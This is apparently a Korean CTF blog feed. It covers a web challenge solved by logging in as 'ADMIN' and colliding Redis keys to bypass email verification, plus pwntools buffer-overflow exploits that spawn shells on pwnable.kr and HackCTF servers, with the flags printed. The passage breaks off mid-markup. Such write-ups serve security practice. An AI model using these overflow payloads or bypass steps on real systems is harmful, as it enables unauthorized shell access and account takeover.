        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image2/blob/main/dctf10th.png?raw=true"></p><p>2021년 1월 30일 오전 9시부터 오후 6시까지 Theory에서 CTF를 주최하였습니다. 이번 대회는 전체적으로 난이도가 낮아 운이 좋게 10등을 할 수 있었고, 풀면서 그나마 공을 들였던 <code>WEB_2021A_Medium</code>라는 문제의 Write Up을 작성해보겠습니다.<br></p><h2 id="Web-WEB-2021A-Medium-936-pts"><a href="#Web-WEB-2021A-Medium-936-pts" class="headerlink" title="(Web) WEB_2021A_Medium [936 pts]"></a>(Web) WEB_2021A_Medium [936 pts]</h2><blockquote><p>WEB_2021A_Medium 문제는 관리자 계정으로 로그인하고, 관리자 계정을 활성화 한 후에 FLAG를 읽는 문제입니다.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>)</span><br><span class="line">    myusr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">    <span class="keyword">if</span> myusr.userid == <span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> myusr.auth:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=FLAG)</span><br><span class="line">    <span class="keyword">return</span> alert(<span class="string">&quot;No Flag&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/flag</code>를 보면 현재 로그인된 사용자가 <code>admin</code>이고, 계정이 활성화가 되어 있으면 <code>FLAG</code>를 보여주는 것을 볼 수 있습니다. 그럼 관리자 계정을 획득하고, 계정을 활성화 시켜보겠습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    userid = db.Column(db.String(<span class="number">80</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    password = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    email = db.Column(db.String(<span class="number">80</span>))</span><br><span class="line">    auth = db.Column(db.Boolean())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, userid, password, email</span>):</span></span><br><span class="line">        self.userid = userid</span><br><span class="line">        self.password = password</span><br><span class="line">        self.email = email</span><br><span class="line">        self.auth = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_json</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;userid&quot;</span>: self.userid.lower(),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: self.password.lower(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: self.email.lower(),</span><br><span class="line">            <span class="string">&quot;auth&quot;</span>: self.auth,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/signin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span>():</span></span><br><span class="line">    <span class="keyword">if</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Already Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;signin.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        userid = request.form.get(<span class="string">&quot;userid&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        userpw = request.form.get(<span class="string">&quot;userpw&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        usr = User.query.filter_by(</span><br><span class="line">            userid=userid, password=hashlib.md5(userpw.encode()).hexdigest()</span><br><span class="line">        ).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(usr, <span class="string">&quot;userid&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Check userid or userpw&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>로그인 로직을 보면 userid, userpw 값을 받아와서 로그인하는 것을 볼 수 있습니다. 여기서 session을 관리 할 때 to_json 함수를 이용해서 사용자 정보를 넣어주는 것을 볼 수 있습니다. to_json 함수를 보면 userid의 값을 lower 함수를 이용해 소문자로 만들어 세션으로 사용하는 것을 볼 수 있습니다. 즉, <code>ADMIN</code>이라는 사용자를 가입해서 로그인을 해주면 to_json 함수에 의해서 <code>admin</code>으로 로그인이 됩니다. 이를 통해 관리자 아이디는 쉽게 획득했습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auth</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, email</span>):</span></span><br><span class="line">        self.email = email</span><br><span class="line">        self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">        self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self</span>):</span></span><br><span class="line">        setcount = conn.get(self.email)</span><br><span class="line">        <span class="keyword">if</span> setcount:</span><br><span class="line">            setcount = <span class="built_in">int</span>(setcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> setcount &lt; <span class="number">5</span>:</span><br><span class="line">            self.random_key = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">111111</span>, <span class="number">999999</span>):04d&#125;</span>&quot;</span></span><br><span class="line">            conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">            conn.<span class="built_in">set</span>(self.email, setcount)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        getcount = conn.get(self.getcount_key)</span><br><span class="line">        <span class="keyword">if</span> getcount:</span><br><span class="line">            getcount = <span class="built_in">int</span>(getcount) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            getcount = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> getcount &lt; <span class="number">5</span>:</span><br><span class="line">            conn.<span class="built_in">set</span>(self.getcount_key, getcount)</span><br><span class="line">            <span class="keyword">return</span> conn.get(self.emailauth_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> auth.<span class="built_in">set</span>():</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> send_mail(email, auth.random_key):</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">f&quot;Send Email To <span class="subst">&#123;email&#125;</span>&quot;</span>, <span class="string">&quot;/email_verify_chk&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Send Email Err&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/email_verify_chk&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">email_verify_chk</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_login():</span><br><span class="line">        <span class="keyword">return</span> alert(<span class="string">&quot;No Signin!&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    email = get_useremail()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;email_verify_chk.html&quot;</span>, email=email)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        auth = Auth(email)</span><br><span class="line">        authcode = auth.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authcode:</span><br><span class="line">            <span class="keyword">return</span> alert(<span class="string">&quot;Too many Auth or No Code Generated&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> code == authcode:</span><br><span class="line">                usr = User.query.filter_by(userid=get_userid()).first()</span><br><span class="line">                usr.auth = <span class="literal">True</span></span><br><span class="line">                db.session.commit()</span><br><span class="line">                session[<span class="string">&quot;info&quot;</span>] = usr.to_json()</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;AUTH!&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> alert(<span class="string">&quot;Check Code&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/email_verify</code>는 보면 현재 사용자의 이메일로 인증 번호를 생성하는 로직입니다. 코드를 보면 현재 사용자의 이메일을 Auth 클래스의 인자로 넘겨주며 클래스를 생성하고, set 함수를 이용해서 인증 코드를 생성해서 디비에 저장하고 있는 것을 볼 수 있습니다.<br></p><p><code>/email_verify_chk</code>는 인증 번호를 입력 받고, 디비에 저장되어 있는 값과 비교해서 참이면 활성화를 해주고, 거짓이면 그대로 비활성화로 있습니다.<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.email = email</span><br><span class="line">self.emailauth_key = <span class="string">f&quot;auth:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line">self.getcount_key = <span class="string">f&quot;auth_count:<span class="subst">&#123;self.email&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">conn.<span class="built_in">set</span>(self.emailauth_key, self.random_key)</span><br><span class="line">conn.<span class="built_in">set</span>(self.getcount_key, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">conn.<span class="built_in">set</span>(self.email, setcount)</span><br></pre></td></tr></table></figure><p>위 코드를 보면 email 값을 이용해서 email, emailauth_key, getcount_key 값을 만들고, 이를 redis의 키로 사용하는 것을 볼 수 있습니다. 그리고 emailauth_key가 실제로 입력 받은 인증 번호와 비교를 하는 값 입니다. 하지만 우리는 이 값을 알아낼 수는 없지만 로직을 이해하고 있다면 쉽게 우회할 수 있습니다. 해당 로직에 대한 내용은 <a href="https://dreamhack.io/learn/29#t209">드림핵 강의</a>에서 자세하게 다루고 있습니다. 이번 로직은 설명하기 귀찮고, 그냥 글을 보는 게 좋을 거 같습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li><code>ADMIN</code>으로 회원 가입을 하고, <code>ADMIN</code>으로 로그인을 해서 관리자로 로그인을 한다.</li><li><code>auth:admin</code>인 사용자를 하나 더 만들어서 로그인을 한 후에, 인증 코드를 받는다.</li><li>(2)번 시나리오에서의 로직 때문에 관리자가 <code>/email_verify_chk</code>에서 <code>입력 받은</code> 인증 코드와 비교되는 인증 코드가 1로 바뀐다.</li><li>관리자에서 인증 코드를 1을 보내주면 관리자 게정이 활성화된다. </li><li>이제 FLAG를 읽으면 된다.<br></li></ol><p>위 내용은 그냥 링크 달아준 드림핵 강의를 한 번 보면 이해가 가실 겁니다.<br></p><blockquote><p>FLAG : DH{3cd6941075580d889519fcf1bd422bd1}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REDIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable Exploitation</title>
      <link href="2021/01/25/2021-01-25-pwn/"/>
      <url>2021/01/25/2021-01-25-pwn/</url>
      
        <content type="html"><![CDATA[<p><strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br></p><hr><h2 id="PWN-D-1-2021-01-25"><a href="#PWN-D-1-2021-01-25" class="headerlink" title="PWN D+1 (2021.01.25)"></a>PWN D+1 (2021.01.25)<br></h2><hr><p>Pwnable.kr Challenge : BOF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 <code>0xcafebabe</code>이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 <code>0xcafebabe</code> 바꿔주면 될 거 같습니다.</strong><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true"></p><p><strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">52</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : daddy, I just pwned a buFFer :)</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0x4030201</span>;</span><br><span class="line">  fgets(&amp;s, <span class="number">45</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">0x4030201</span> &amp;&amp; v5 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou are on the right way!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Shell closed! Bye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 <code>0xDEADBEEF</code>면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 <code>0xDEADBEEF</code>로 바꿔주면 될 거 같습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5  &#x3D; 34h - Ch</span><br><span class="line">v5 &#x3D; 40</span><br></pre></td></tr></table></figure><p><strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">52</span> - <span class="number">12</span>)</span><br><span class="line">payload += p32(<span class="number">0xDEADBEEF</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">void</span> (*v5)(<span class="keyword">void</span>); <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sup;</span><br><span class="line">  fgets(&amp;s, <span class="number">133</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(...)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shell addr : 0x804849B</span></span><br></pre></td></tr></table></figure><p><strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v5 &#x3D; 8Ch - Ch</span><br><span class="line">*v5 &#x3D; 128</span><br></pre></td></tr></table></figure><p><strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">128</span></span><br><span class="line">payload += p32(<span class="number">0x804849B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}</p></blockquote><hr><p>HackCTF Challenge : Basic_FSB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vuln</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span 